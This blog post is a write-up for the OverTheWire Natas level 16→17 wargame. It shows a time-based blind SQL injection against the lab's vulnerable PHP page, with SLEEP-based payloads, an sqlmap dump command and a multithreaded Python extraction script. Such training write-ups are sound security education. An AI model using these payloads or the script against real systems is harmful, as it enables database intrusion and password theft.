<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="I've got too much time on my hands">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.Cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
    <link rel="stylesheet" href="/assets/css/main.min.css ">
    <link rel="canonical" href="https://caminek.rocks/2021/05/28/natas16-17/">
    <link rel="alternate" type="application/rss+xml" title="Caminek" href="https://caminek.rocks/feed.xml ">
    
    <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Natas Level 16 → Level 17 | Caminek</title>
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Natas Level 16 → Level 17" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I’ve got too much time on my hands" />
<meta property="og:description" content="I’ve got too much time on my hands" />
<link rel="canonical" href="https://caminek.rocks/2021/05/28/natas16-17/" />
<meta property="og:url" content="https://caminek.rocks/2021/05/28/natas16-17/" />
<meta property="og:site_name" content="Caminek" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-05-28T22:01:38-04:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Natas Level 16 → Level 17" />
<script type="application/ld+json">
{"@type":"BlogPosting","description":"I’ve got too much time on my hands","headline":"Natas Level 16 → Level 17","dateModified":"2021-05-28T22:01:38-04:00","datePublished":"2021-05-28T22:01:38-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://caminek.rocks/2021/05/28/natas16-17/"},"url":"https://caminek.rocks/2021/05/28/natas16-17/","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->






</head>


  <body>

    <header id="top">
    <div class="wrapper">
        
            <img src="/assets/img/misc/avatar.png" alt="site.icon" width="32" height="32" style="vertical-align:middle"/>
        
        <a href="/" class="brand">Caminek</a>
        <small></small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a href="/">
                    
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/series/">
                        
                            <i class="fa fa-book"></i>Series
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


        <div class="page clearfix" index>
    <div class="left">
        <h1>Natas Level 16 → Level 17</h1>
        <div class="label">

            <div class="label-card">
                <i class="fa fa-calendar"></i> 2021-05-28
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
            


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#ctf" title="Category: ctf" rel="category">ctf</a>&nbsp;
    
        <a href="/category/#wargames" title="Category: wargames" rel="category">wargames</a>&nbsp;
    
        <a href="/category/#web-security" title="Category: web-security" rel="category">web-security</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


            </div>

            <div class="label-card">
            
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <!--a href="/tag/#wargames" title="Tag: wargames" rel="tag">wargames</a-->
        <a href="/tag/#wargames" title="Tag: wargames" rel="tag">wargames</a>&nbsp;
    
        <!--a href="/tag/#ctf" title="Tag: ctf" rel="tag">ctf</a-->
        <a href="/tag/#ctf" title="Tag: ctf" rel="tag">ctf</a>&nbsp;
    
        <!--a href="/tag/#overthewire" title="Tag: overthewire" rel="tag">overthewire</a-->
        <a href="/tag/#overthewire" title="Tag: overthewire" rel="tag">overthewire</a>&nbsp;
    
        <!--a href="/tag/#web-security" title="Tag: web-security" rel="tag">web-security</a-->
        <a href="/tag/#web-security" title="Tag: web-security" rel="tag">web-security</a>
    
  

</span>

            </div>

        </div>
        <hr>
        <article itemscope itemtype="http://schema.org/BlogPosting">
            <h2 id="level-goal">Level Goal</h2>
<p>Excluding the URL and username, the Level Goal section is blank for the Natas ctf.</p>

<h2 id="solution">Solution</h2>
<p>The natas17 site is a slightly altered version of the natas 15 site. While the search still works the same, the portion of the code that was responsible that reported whether or not the user exists is now commented out. This means the natas15 solution will no longer work.</p>

<p>The site now uses POST instead of GET for submitting form data.  Debug is still available and still uses GET.</p>

<p>Source:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span>
<span class="cm">/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"username"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">'localhost'</span><span class="p">,</span> <span class="s1">'natas17'</span><span class="p">,</span> <span class="s1">'&lt;censored&gt;'</span><span class="p">);</span>
    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">'natas17'</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
    
    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * from users where username=</span><span class="se">\"</span><span class="s2">"</span><span class="mf">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span><span class="mf">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"debug"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"Executing query: </span><span class="nv">$query</span><span class="s2">&lt;br&gt;"</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">//echo "This user exists.&lt;br&gt;";</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">//echo "This user doesn't exist.&lt;br&gt;";</span>
    <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">//echo "Error in query.&lt;br&gt;";</span>
    <span class="p">}</span>

    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"index.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span> 
</code></pre></div></div>

<p>It would seem at first glance there’s little we can do here. We can still perform the query but have no way to get any output. The weakness here is that the inputs are still not sanitized. This means we can add to the SQL query and create a different attack method that also makes use of the Blind attacks from the previous levels.</p>

<p>In the previous levels were able to check whether a statement was true or false based upon the output we got back from the server. Since we’re unable to get any text, we’ll need to come up with something different. We’ll need to use the SLEEP command, which works as you’d expect, and some boolean logic.</p>

<p>In a previous level, we combined two conditions with an OR. We altered the statement to say if we entered both the correct username and password, or if 1=1, give us access. Since OR only requires one side of the statement to be true, we gained access.</p>

<p>This time we’ll use AND which requires both sides of the statement to be true. On the left side of the AND, we’ll ask the server if the username is valid and the password contains a specific character. On the right side, we’ll add the SLEEP command.  The left side of the statement will appear to us to function the same whether we enter a correct character or not. The SLEEP command will allow us to determine if there was a match. If the given character doesn’t match, the right side of the AND is not evaluated. If the character matches, the response from the page will be measurably slower. By monitoring for slow responses, we can determine if we have a match or not.  This is known as a Timing attack.</p>

<p>Since the user input is submitted using POST instead of GET, we won’t be able to craft a URL for testing. While I’m sure there are addons to simplify sending form data with POST, I’m going to stick with Firefox’s built-in Developer Tools.</p>

<p>First, open the developer tools and click on the Network tab. Once that is done, enter anything into the form and click the button. In the network section, you’ll see all the javascript load, index.php, and the attempt at loading the favicon. The only part we’re concerned with is index.php.</p>

<p><img src="/assets/img/natas/natas17_network_tab.png" alt="Dev Tools Network Tab" height="239" width="652" /></p>

<p>Right-click on the index.php line and choose Edit and Resend. A panel will appear to the right that will allow you to enter POST data and resend it. You may need to scroll or resize the developer tools to see Request Body section. In the screenshot below, you’ll see that I entered natas18 into the form before I clicked the button.</p>

<p><img src="/assets/img/natas/natas17_edit_resend.png" alt="Edit and Resend Panel" height="357" width="516" /></p>

<p>Delete all the text in the Request Body section and enter the following:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=natas18" AND password LIKE BINARY "%a%" and SLEEP(5) #
</code></pre></div></div>

<p>If you’d like to use debug, you can append <strong>?debug</strong> to the URL at the top of the panel. Do not include it in the Request Body. I won’t be using debug, but you’re welcome to. Note that if you do, you won’t see the results in the browser window. I’ll cover where the output is in the next section.</p>

<p>Click the blue Send button at the top of the panel.  The panel will close and the results of your search will appear at the bottom of the file list, and be highlighted once the query is complete.</p>

<p>Single-click on highlighted index.php entry and select Timings. If you’re using debug, you can click on Response to see a rendered version of the webpage. Since debug simply returns the query entered, you can’t use it for an attack.</p>

<p><img src="/assets/img/natas/natas17_timings_a.png" alt="Network Timings for Character a" height="207" width="553" /></p>

<p>If you look at the Waiting entry on the Timings graph you’ll see we got our response in 124ms. Since our attack contains a 5-second sleep, we know the password does not contain an ‘a’.</p>

<p>Let’s search for a character that’s in the password. Right-click on index.php and enter the following into the Request Body:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=natas18" AND password LIKE BINARY "%x%" and SLEEP(5) #
</code></pre></div></div>

<p>Click on the blue Send button. Notice that the panel didn’t disappear as quickly as it did last time. Once it does disappear, look at the highlighted index.php in the file list. Notice there’s now a turtle to the right. This is a quick visual indicator that the file was slow to load.</p>

<p><img src="/assets/img/natas/natas17_turtle.png" alt="Dev Tools Network Tab Showing Turtle Icon" height="328" width="652" /></p>

<p>Single-click on the highlighted index.php and then click on Timings in the panel on the right.</p>

<p><img src="/assets/img/natas/natas17_timings_x.png" alt="Network Timings for Character x" height="208" width="504" /></p>

<p>Here you can see that the Waiting portion of the graph is now 5.12s. This tells us that the password contains an ‘x’.</p>

<p>As with natas15, we can solve this with sqlmap and with a Python script. I’ll show both below. Unlike natas15, I’ll only include a multithreaded script for this level.</p>

<h3 id="sqlmap">sqlmap</h3>
<p>Running sqlmap took 12 minutes on my system, even though sqlmap set the sleep timer to 1 second. This is due to sqlmap leaking all users and passwords. The database contains 4 accounts, with each account having a 32 character password. You’ll need to supply the current level password to run the following:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"http://natas17.natas.labs.overthewire.org/index.php"</span> <span class="nt">--auth-type</span><span class="o">=</span>Basic <span class="nt">--auth-cred</span><span class="o">=</span>natas17:8------------------------------w <span class="nt">--data</span><span class="o">=</span><span class="s2">"username=natas18"</span> <span class="nt">--level</span><span class="o">=</span>3 <span class="nt">--risk</span><span class="o">=</span>1 <span class="nt">--technique</span><span class="o">=</span>T <span class="nt">--threads</span><span class="o">=</span>4 <span class="nt">--dbms</span><span class="o">=</span>MySQL <span class="nt">-D</span> natas17 <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">-C</span> username,password <span class="nt">--dump</span> <span class="nt">--batch</span>
</code></pre></div></div>

<p>Here’s a breakdown of each option:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-u              URL
--auth-type     HTTP authentication
--auth-cred     HTTP authentication credentials (name:password)
--data          Data string to be sent
--level         Number of checks to be performed. 
                Range is 1 to 5. Default is 1.
--risk          Types of payloads to use. Higher numbers could cause problems for the server. 
                Range is 1 to 3.  Default is 1.
--technique     T is for Time-based attacks
--threads       Max number of concurrent HTTP(s) requests
--dbms          DataBase Management System 
-D              Database name        
-T              Table name
-C              Column name(s)
--dump          Dump DBMS database table entries
--batch         Never ask for user input, use the default behaviour
</code></pre></div></div>

<h3 id="python">Python</h3>
<p>Unlike sqlmap, this script will not determine if the sleep time is too short. In my limited testing, I’ve received a response to my queries in 0.125 seconds. I’m going to use 1 second as my sleep timer. Depending on your internet connection, you may need to increase the sleep time. You’ll need to supply the current-level password to run the script.</p>

<p>Script Performance:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Filtering characters completed in 5.85 seconds
Password search completed in 49.35 seconds

Completed in 55.2 seconds
</code></pre></div></div>

<p>Here’s the script.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
<span class="kn">import</span> <span class="nn">concurrent.futures</span>


<span class="n">start_script</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
<span class="n">all_chars</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">)</span>
<span class="n">natas17_password</span> <span class="o">=</span> <span class="s">"8------------------------------w"</span>  <span class="c1"># Password for the current level
</span><span class="n">natas18_password</span> <span class="o">=</span> <span class="s">""</span>  <span class="c1"># Buffer for the next level password
</span><span class="n">filtered_chars</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">sleep_time</span> <span class="o">=</span> <span class="mi">1</span>  <span class="c1"># how many seconds of sleep to use in timing attack
</span>

<span class="k">def</span> <span class="nf">get_chars</span><span class="p">(</span><span class="n">char</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'username'</span><span class="p">:</span> <span class="s">'natas18" and password LIKE BINARY "%'</span> <span class="o">+</span> <span class="n">char</span> <span class="o">+</span> <span class="s">'%" and sleep('</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sleep_time</span><span class="p">)</span> <span class="o">+</span> <span class="s">') #'</span><span class="p">}</span>

    <span class="n">attack_start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://natas17.natas.labs.overthewire.org/index.php?debug'</span><span class="p">,</span>
                        <span class="n">auth</span><span class="o">=</span><span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="s">'natas17'</span><span class="p">,</span> <span class="n">natas17_password</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">attack_end</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
    <span class="n">attack_time</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">attack_end</span> <span class="o">-</span> <span class="n">attack_start</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">attack_time</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">char</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>


<span class="n">start_filter</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
<span class="k">with</span> <span class="n">concurrent</span><span class="p">.</span><span class="n">futures</span><span class="p">.</span><span class="n">ThreadPoolExecutor</span><span class="p">()</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">executor</span><span class="p">.</span><span class="nb">map</span><span class="p">(</span><span class="n">get_chars</span><span class="p">,</span> <span class="n">all_chars</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">r</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
            <span class="n">filtered_chars</span> <span class="o">=</span> <span class="n">filtered_chars</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

<span class="n">end_filter</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">Filtering characters completed in </span><span class="si">{</span><span class="nb">round</span><span class="p">(</span><span class="n">end_filter</span> <span class="o">-</span> <span class="n">start_filter</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="s"> seconds'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_password</span><span class="p">(</span><span class="n">fc</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'username'</span><span class="p">:</span> <span class="s">'natas18" and password LIKE BINARY "'</span> <span class="o">+</span> <span class="n">natas18_password</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">fc</span><span class="p">)</span> <span class="o">+</span>
                        <span class="s">'%" and sleep('</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sleep_time</span><span class="p">)</span> <span class="o">+</span> <span class="s">') #'</span><span class="p">}</span>

    <span class="n">attack_start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://natas17.natas.labs.overthewire.org/index.php?debug'</span><span class="p">,</span>
                        <span class="n">auth</span><span class="o">=</span><span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="s">'natas17'</span><span class="p">,</span> <span class="n">natas17_password</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">attack_end</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
    <span class="n">attack_time</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">attack_end</span> <span class="o">-</span> <span class="n">attack_start</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">attack_time</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">fc</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>


<span class="n">start_password</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
    <span class="k">with</span> <span class="n">concurrent</span><span class="p">.</span><span class="n">futures</span><span class="p">.</span><span class="n">ThreadPoolExecutor</span><span class="p">()</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">executor</span><span class="p">.</span><span class="nb">map</span><span class="p">(</span><span class="n">get_password</span><span class="p">,</span> <span class="n">filtered_chars</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">r</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">natas18_password</span> <span class="o">=</span> <span class="n">natas18_password</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="n">end_password</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">Password search completed in </span><span class="si">{</span><span class="nb">round</span><span class="p">(</span><span class="n">end_password</span> <span class="o">-</span> <span class="n">start_password</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="s"> seconds'</span><span class="p">)</span>

<span class="n">end_script</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">Completed in </span><span class="si">{</span><span class="nb">round</span><span class="p">(</span><span class="n">end_script</span> <span class="o">-</span> <span class="n">start_script</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="s"> seconds'</span><span class="p">)</span>
</code></pre></div></div>

        </article>
        <hr>
        

        <div class="post-recent">
    <div class="pre" style="display:inline-block; margin-top: 20px;">
        
        <p><i class="fa fa-arrow-left"></i> <a href="/2021/05/28/natas15-16/">Natas Level 15 → Level 16</a></p>
        
    </div>
    <div class="nex" style="display:inline-block; margin-top: 20px; float:right;">
        
        <p><a href="/2021/05/29/natas17-18/">Natas Level 17 → Level 18</a> <i class="fa fa-arrow-right"></i></p>
        
    </div>
</div>

        
        
        

    </div>
    <button class="anchor"><i class="fa fa-anchor"></i></button>
    <div class="right">
        <div class="wrap">
            <div class="side">
                <div>
                    <i class="fa fa-pencil-square-o" aria-hidden="true"></i>
                    Recent Posts
                </div>
                <ul class="content-ul" recent>
                    
                        <li><a href="/2021/05/31/natas26-27/">Natas Level 26 → Level 27</a></li>
                    
                        <li><a href="/2021/05/31/natas25-26/">Natas Level 25 → Level 26</a></li>
                    
                        <li><a href="/2021/05/30/natas24-25/">Natas Level 24 → Level 25</a></li>
                    
                        <li><a href="/2021/05/30/natas23-24/">Natas Level 23 → Level 24</a></li>
                    
                        <li><a href="/2021/05/30/natas22-23/">Natas Level 22 → Level 23</a></li>
                    
                </ul>
            </div>

            <!-- Series -->
            <div class="side ">
                <div>
                    <i class="fa fa-book" aria-hidden="true"></i>
                    Series
                </div>
                <ul class="content-ul">
                    
                    
                    

                    

                    
                    

                    
                        
                            <li>
                                
                                    <a href="/2021/05/29/natas18-19/">Natas Level 18 → Level 19</a>
                                
                            </li>
                        

                    
                        
                            <li>
                                
                                    <a href="/2021/05/29/natas17-18/">Natas Level 17 → Level 18</a>
                                
                            </li>
                        

                    
                        
                            <li>
                                
                                    <strong>Natas Level 16 → Level 17</strong>
                                
                            </li>
                        

                    
                        
                            <li>
                                
                                    <a href="/2021/05/28/natas15-16/">Natas Level 15 → Level 16</a>
                                
                            </li>
                        

                    
                        
                            <li>
                                
                                    <a href="/2021/05/27/natas14-15/">Natas Level 14 → Level 15</a>
                                
                            </li>
                        

                    
                </ul>
            </div>

            <!-- Content -->
            <div class="side ">
                <div>
                    <i class="fa fa-th-list"></i>
                    Categories
                </div>
                <ul class="content-ul" cate>
                    
                    <li>
                        <a href="/category/#reverse-engineering" class="categories-list-item" cate="reverse-engineering">
                            <span class="name">
                                reverse-engineering
                            </span>
                            <span class="badge">13</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#x86-64" class="categories-list-item" cate="x86-64">
                            <span class="name">
                                x86-64
                            </span>
                            <span class="badge">8</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#ctf" class="categories-list-item" cate="ctf">
                            <span class="name">
                                ctf
                            </span>
                            <span class="badge">68</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#wargames" class="categories-list-item" cate="wargames">
                            <span class="name">
                                wargames
                            </span>
                            <span class="badge">63</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#linux" class="categories-list-item" cate="linux">
                            <span class="name">
                                linux
                            </span>
                            <span class="badge">35</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#web-security" class="categories-list-item" cate="web-security">
                            <span class="name">
                                web-security
                            </span>
                            <span class="badge">28</span>
                        </a>
                    </li>
                    
                </ul>
            </div>

            <!-- Tag Cloud -->
            
        </div>
    </div>
</div>
<script>
/**
 * target _blank
 */
(function() {
    var aTags = document.querySelectorAll('article a:not([id])')
    for (var i = 0; i < aTags.length; i++) {
        aTags[i].setAttribute('target', '_blank')
    }
}());
</script>
<!-- <script src="/assets/js/pageContent.js " charset="utf-8"></script> -->


    <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
            
        </p>
        <p class="contact">
            Find me on: 
            <a href="https://github.com/caminek" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a> 
             
        </p>
        <p class="power">
            <span>
                Site powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://pages.github.com/">Github Pages</a>.
            </span>
            <span>
                Theme designed by <a href="https://github.com/Gaohaoyang">HyG</a>, and modified by <a href="https://github.com/caminek">caminek</a>.
            </span>
        </p>
    </div>
</footer>

    <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

    <!-- <script src=" /assets/js/main.js " charset="utf-8"></script>
    <script src=" /assets/js/smooth-scroll.min.js " charset="utf-8"></script> -->
    <script src=" /assets/js/all.js " charset="utf-8"></script>
    <script type="text/javascript">
      smoothScroll.init({
        speed: 500, // Integer. How fast to complete the scroll in milliseconds
        easing: 'easeInOutCubic', // Easing pattern to use
        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
      });
    </script>
    <!-- <script src=" /assets/js/scroll.min.js " charset="utf-8"></script> -->
  </body>

</html>
